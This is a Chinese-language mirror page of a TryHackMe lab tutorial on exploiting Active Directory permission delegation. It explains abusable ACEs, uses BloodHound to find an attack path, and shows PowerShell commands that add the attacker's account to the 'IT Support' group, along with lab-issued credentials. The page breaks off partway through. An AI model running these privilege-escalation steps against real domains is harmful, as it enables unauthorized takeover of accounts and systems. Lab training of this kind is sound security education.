<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Modules/Compromising-Active-Directory/Exploiting-Active-Directory" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.0.1">
<title data-rh="true">Exploiting Active Directory - Active Directory 利用 | TryHackMe CN Mirror</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Compromising-Active-Directory/Exploiting-Active-Directory"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Exploiting Active Directory - Active Directory 利用 | TryHackMe CN Mirror"><meta data-rh="true" name="description" content="TryHackMe | Exploiting Active Directory"><meta data-rh="true" property="og:description" content="TryHackMe | Exploiting Active Directory"><link data-rh="true" rel="icon" href="/TryHackMe-CN/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Compromising-Active-Directory/Exploiting-Active-Directory"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Compromising-Active-Directory/Exploiting-Active-Directory" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/TryHackMe-CN/docs/Modules/Compromising-Active-Directory/Exploiting-Active-Directory" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/TryHackMe-CN/blog/rss.xml" title="TryHackMe CN Mirror RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/TryHackMe-CN/blog/atom.xml" title="TryHackMe CN Mirror Atom Feed"><link rel="stylesheet" href="/TryHackMe-CN/assets/css/styles.351040f8.css">
<script src="/TryHackMe-CN/assets/js/runtime~main.b19afc47.js" defer="defer"></script>
<script src="/TryHackMe-CN/assets/js/main.b8ab613b.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/TryHackMe-CN/"><div class="navbar__logo"><img src="/TryHackMe-CN/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/TryHackMe-CN/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">Tryhackme CN Mirror</b></a><a class="navbar__item navbar__link" href="/TryHackMe-CN/docs/LearningPaths/">Learning Paths</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/TryHackMe-CN/docs/Modules/">Modules</a><a class="navbar__item navbar__link" href="/TryHackMe-CN/docs/Networks/">Networks</a><a class="navbar__item navbar__link" href="/TryHackMe-CN/blog">Blog</a></div><div class="navbar__items navbar__items--right"><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/TryHackMe-CN/docs/Modules/">Modules - 模块</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" aria-expanded="true" href="/TryHackMe-CN/docs/Modules/Compromising-Active-Directory/">Compromising Active Directory - 妥协活动目录</a><button aria-label="折叠侧边栏分类 &#x27;Compromising Active Directory - 妥协活动目录&#x27;" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/TryHackMe-CN/docs/Modules/Compromising-Active-Directory/Active-Directory-Basics">Active Directory Basics - Active Directory 基础</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/TryHackMe-CN/docs/Modules/Compromising-Active-Directory/Breaching-Active-Directory">Breaching Active Directory - Active Directory 突破</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/TryHackMe-CN/docs/Modules/Compromising-Active-Directory/Enumerating-Active-Directory">Enumerating Active Directory - Active Directory 列举</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/TryHackMe-CN/docs/Modules/Compromising-Active-Directory/Lateral-Movement-and-Pivoting">Lateral Movement and Pivoting - 横向移动和枢纽</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/TryHackMe-CN/docs/Modules/Compromising-Active-Directory/Exploiting-Active-Directory">Exploiting Active Directory - Active Directory 利用</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/TryHackMe-CN/docs/Modules/Compromising-Active-Directory/Persisting-Active-Directory">Persisting Active Directory - Active Directory 持久化</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/TryHackMe-CN/docs/Modules/Compromising-Active-Directory/Credentials-Harvesting">Credentials Harvesting - 凭据收集</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/TryHackMe-CN/docs/Modules/Shells-and-Privilege-Escalation/">Shells and Privilege Escalation - Shell 和特权提升</a><button aria-label="展开侧边栏分类 &#x27;Shells and Privilege Escalation - Shell 和特权提升&#x27;" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/TryHackMe-CN/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/TryHackMe-CN/docs/Modules/Compromising-Active-Directory/"><span itemprop="name">Compromising Active Directory - 妥协活动目录</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Exploiting Active Directory - Active Directory 利用</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><h1>Exploiting Active Directory - Active Directory 利用</h1>
<blockquote>
<p><a href="https://tryhackme.com/room/exploitingad" target="_blank" rel="noopener noreferrer">TryHackMe | Exploiting Active Directory</a></p>
<p>Updated in 2023-12-12</p>
<p>学习常见的 AD 利用技术，让你在 AD 环境中达成目标。</p>
<p>Learn common AD exploitation techniques that can allow you to reach your goal in an AD environment.</p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction">Introduction<a href="#introduction" class="hash-link" aria-label="Introduction的直接链接" title="Introduction的直接链接">​</a></h2>
<p>这个网络是 <code>Breaching AD</code> 和 <code>Enumerating AD</code> 的延续。请确保在继续进行这个网络之前完成这些网络。另外，请注意，我们将会对 AD 对象进行详细讨论。如果你需要复习，请快速浏览一下这个房间。现在我们已经突破了 AD 并枚举了域的结构，我们将探索不同的方法，利用可能在我们枚举中浮出水面的配置错误。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ad-利用">AD 利用<a href="#ad-利用" class="hash-link" aria-label="AD 利用的直接链接" title="AD 利用的直接链接">​</a></h3>
<p>现在我们已经执行了内部侦察，并了解了关于 AD 结构和环境的情况，是时候进入利用阶段了。这个阶段利用配置错误执行横向移动和权限提升的组合，直到我们达到一个适当的位置来执行我们的目标，如下图所示。这个阶段通常与持久化结合在一起，以确保我们不会失去新获得的位置，但这将在下一个房间中讨论。通常还会与额外的枚举结合在一起，因为我们的新位置可能允许我们获取有关环境情况的其他信息。</p>
<div style="text-align:center"><p><img loading="lazy" alt="AD 利用流程" src="/TryHackMe-CN/assets/images/image_20231207-160746-cdded1a8c3d10f5db21b2db6c5f4a4b8.png" width="920" height="410" class="img_ev3q"></p></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="学习目标">学习目标<a href="#学习目标" class="hash-link" aria-label="学习目标的直接链接" title="学习目标的直接链接">​</a></h3>
<p>在这个网络中，我们将涵盖几种可以用来利用 AD 配置错误的方法。这绝不是一个完整的列表，因为可用的方法通常高度情境化，取决于 AD 结构和环境。但是，我们将涵盖以下用于利用 AD 的技术：</p>
<ul>
<li>AD 委派</li>
<li>强制身份验证中继</li>
<li>组策略对象</li>
<li>针对 AD 用户</li>
<li>域信任</li>
<li>白银票据和黄金票据</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="初始凭据">初始凭据<a href="#初始凭据" class="hash-link" aria-label="初始凭据的直接链接" title="初始凭据的直接链接">​</a></h3>
<p>访问 <code>http://distributor.za.tryhackme.loc/creds</code> 得到初始凭据</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Your credentials have been generated: Username: christopher.smith Password: Mznl7973</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="exploiting-permission-delegation---利用权限委派">Exploiting Permission Delegation - 利用权限委派<a href="#exploiting-permission-delegation---利用权限委派" class="hash-link" aria-label="Exploiting Permission Delegation - 利用权限委派的直接链接" title="Exploiting Permission Delegation - 利用权限委派的直接链接">​</a></h2>
<p>Active Directory 可以通过一个名为 Permission Delegation（不要与接下来要讨论的 Kerberos 委派混淆）的功能来委派权限和特权。委派是使 AD 在组织中如此强大的原因。想象一下，我们为一个有 50000 名员工的组织工作。由于我们关心安全，我们只有三个用户可以访问 DA 凭据。对于这三个用户来说，处理所有用户的请求，比如重置他们的密码，将是不可能的。使用委派，我们可以将强制更改用户密码的权限委派给帮助台团队，这意味着他们现在对这个特定功能拥有了委派特权。原则上，为了保持委派的安全性，应该遵循最小特权原则。然而，在大型组织中，要做到这一点并不容易。在这个任务中，我们将看看如何利用一些委派配置错误。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="权限委派">权限委派<a href="#权限委派" class="hash-link" aria-label="权限委派的直接链接" title="权限委派的直接链接">​</a></h3>
<p>权限委派的利用通常被称为基于 ACL 的攻击。AD 允许管理员配置访问控制条目（ACE），这些条目填充了自主访问控制列表（DACL），因此得名基于 ACL 的攻击。几乎任何 AD 对象都可以通过 ACE 进行安全配置，然后描述其他任何 AD 对象对目标对象具有的允许和拒绝权限。</p>
<p>然而，如果这些 ACE 被配置错误，攻击者可能会利用它们。让我们再次看看我们的例子。如果 IT 支持团队被授予了对 Domain Users 组的 ForceChangePassword ACE，这将被视为不安全。当然，他们可以重置忘记密码的员工的密码，但 这种配置错误也会允许他们重置特权帐户的密码，例如属于 Domain Admins 组的帐户，实质上允许特权提升。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="利用-ace访问控制条目">利用 ACE（访问控制条目）<a href="#利用-ace访问控制条目" class="hash-link" aria-label="利用 ACE（访问控制条目）的直接链接" title="利用 ACE（访问控制条目）的直接链接">​</a></h3>
<p>滥用 ACE（访问控制条目）的数量可观，每个漏洞利用的方式都有所不同。<a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#" target="_blank" rel="noopener noreferrer">Bloodhound 文档</a> 有助于解释列举的 ACE 以及它们如何被利用。然而，在这里我们将看一下几个显著的：</p>
<ul>
<li>ForceChangePassword：我们有能力在不知道用户当前密码的情况下设置其当前密码。</li>
<li>AddMembers：我们有能力将用户（包括我们自己的帐户）、组或计算机添加到目标组。</li>
<li>GenericAll：我们对对象拥有完全控制权，包括更改用户密码、注册 SPN 或将 AD 对象添加到目标组的能力。</li>
<li>GenericWrite：我们可以更新目标对象的任何非受保护参数。例如，这可能使我们能够更新 scriptPath 参数，这将导致用户下次登录时执行脚本。</li>
<li>WriteOwner：我们可以更新目标对象的所有者。我们可以将自己设为所有者，从而获得对对象的额外权限。</li>
<li>WriteDACL：我们可以向目标对象的 DACL 中写入新的 ACE。例如，我们可以写入一个 ACE，授予我们的帐户对目标对象的完全控制。</li>
<li>AllExtendedRights：我们可以执行与目标对象相关的扩展 AD 权限的任何操作。这包括例如强制更改用户密码的能力。</li>
</ul>
<p>为了利用这些 ACE，我们需要一种与 AD 交互的方法来发出这些请求。两种最佳选择是 AD-RSAT PowerShell cmdlet 或 PowerSploit。根据入侵情况 和环境中的检测工具，其中一种选项可能更隐秘。在这个任务中，我们将展示两种方法。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="bloodhound">Bloodhound<a href="#bloodhound" class="hash-link" aria-label="Bloodhound的直接链接" title="Bloodhound的直接链接">​</a></h3>
<p>Sharphound 已经为您执行过，并作为一个任务文件附加了进来。在 AttackBox 或您的 Kali 机器上启动 Bloodhound 并导入数据。但是，您也可以按照 “枚举 AD” 房间提供的步骤重新运行 Sharphound。</p>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>提示</div><div class="admonitionContent_BuS1"><p>如果出现 <code>Unable to connect to LDAP, verify your credentials</code> ，请验证您的凭据并确保域设置正确</p></div></div>
<p>我们提供了一个 SharpHound 数据的 ZIP 文件作为一个任务文件。在 AttackBox 上，您可以在 <code>/root/Rooms/ExploitingAD/</code> 下找到 ZIP 文件。首先，我们需要启动 neo4j：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Command Prompt</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">thm@thm:~# neo4j console start</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Active database: graph.db</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Directories in use:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  home:         /var/lib/neo4j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  config:       /etc/neo4j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  logs:         /var/log/neo4j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  plugins:      /var/lib/neo4j/plugins</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  import:       /var/lib/neo4j/import</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  data:         /var/lib/neo4j/data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  certificates: /var/lib/neo4j/certificates</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  run:          /var/run/neo4j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Starting Neo4j.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[....]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2022-03-13 19:59:18.014+0000 INFO  Bolt enabled on 127.0.0.1:7687.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在另一个终端选项卡中运行命令 <code>bloodhound --no-sandbox</code>。这将显示认证的 GUI 界面：</p>
<div style="text-align:center"><p><img loading="lazy" alt="bloodhound GUI Starting" src="/TryHackMe-CN/assets/images/image_20231234-163424-91fe178cf009f32db4c221b334c91c8d.png" width="492" height="377" class="img_ev3q"></p></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="权限提升">权限提升<a href="#权限提升" class="hash-link" aria-label="权限提升的直接链接" title="权限提升的直接链接">​</a></h3>
<p>如果在 Bloodhound 中搜索我们在任务 1 中分配的用户账户，我们会发现我们并没有很多权限。我们有能力远程桌面连接到 THMWRK1，但这只会给我们提供低权限的访问。</p>
<div style="text-align:center"><p><img loading="lazy" alt="Bloodhound 针对用户进行检索" src="/TryHackMe-CN/assets/images/image_20231238-163820-9af98062f63b27e8ee879f464f9965e5.png" width="619" height="193" class="img_ev3q"></p></div>
<p>由于域是分层的，我们的第一步将是攻击第二层基础设施。我们需要攻击第二层管理员组，因为这个组对所有工作站具有管理员特权。让我们询问 Bloodhound 是否有可能找到一条路径来攻击这个组。将你的用户账户作为起始位置，第二层管理员组作为终止位置添加进去。</p>
<div style="text-align:center"><p><img loading="lazy" alt="Bloodhound 针对基础设施搜索 攻击路径" src="/TryHackMe-CN/assets/images/image_20231238-163850-afa9ce20c495412ef54580c734ccd9bb.png" width="1164" height="706" class="img_ev3q"></p></div>
<p>Bloodhound 显示了一个非常有趣的路径。看起来在这个域中有一点点权限委派。一个管理员 通过为 IT 支持组提供了对 Domain Users 组的 AddMembers ACE 来错误配置了权限委派。这意味着 Domain Users 组的任何成员（包括我们的账户）都可以将帐户添加到 IT 支持组中。此外，Bloodhound 显示 IT 支持组对于第二层管理员组成员有 ForceChangePassword ACE。这不是真正的配置错误，因为第二层管理员并不那么敏感，但当与最初的错误配置结合时，它提供了一条非常有效的攻击路径。让我们利用它！</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="addmember---添加成员">AddMember - 添加成员<a href="#addmember---添加成员" class="hash-link" aria-label="AddMember - 添加成员的直接链接" title="AddMember - 添加成员的直接链接">​</a></h3>
<p>这个攻击路径的第一步是将我们的 AD 账户添加到 IT 支持组。我们将使用 AD-RSAT 工具集中的 Add-ADGroupMember PowerShell cmdlet 来实现。在 THMJMP1 主机上启动 PowerShell（无论是通过 RDP 还是通过 SSH），并运行以下命令来添加你的账户：</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">PowerShell</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">PS</span><span class="token plain"> C:\&gt;</span><span class="token function" style="color:#d73a49">Add-ADGroupMember</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;IT Support&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Members </span><span class="token string" style="color:#e3116c">&quot;Your.AD.Account.Username&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>我们可以使用 Get-ADGroupMember 命令来验证命令是否生效：</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">PowerShell</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">PS</span><span class="token plain"> C:\&gt;</span><span class="token function" style="color:#d73a49">Get-ADGroupMember</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Identity </span><span class="token string" style="color:#e3116c">&quot;IT Support&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">distinguishedName : CN=hugh</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">jones</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">OU=Consulting</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">OU=People</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">DC=za</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">DC=tryhackme</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">DC=loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">name              : hugh</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">jones</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">objectClass       : user</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">objectGUID        : 460178d3-c818-4e28-9a39-b1ab2b0d3779</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SamAccountName    : hugh</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">jones</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SID               : S-1-5-21-3885271727-2693558621-2658995185-1113</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" 